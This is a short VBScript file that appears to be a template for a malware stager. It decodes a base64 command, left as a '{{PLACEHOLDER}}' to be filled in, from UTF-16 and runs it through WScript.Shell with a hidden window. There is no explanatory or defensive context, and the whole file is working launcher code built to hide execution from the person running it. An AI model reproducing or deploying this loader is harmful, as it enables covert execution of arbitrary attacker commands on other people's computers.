Dim encodedCommand
encodedCommand = "{{PLACEHOLDER}}"

Function DecodeBase64(base64String)
    Dim xmlDoc, node, stream
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "Unicode"
    DecodeBase64 = stream.ReadText
    stream.Close
End Function

Dim decodedCommand
decodedCommand = DecodeBase64(encodedCommand)

Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run decodedCommand, 0, True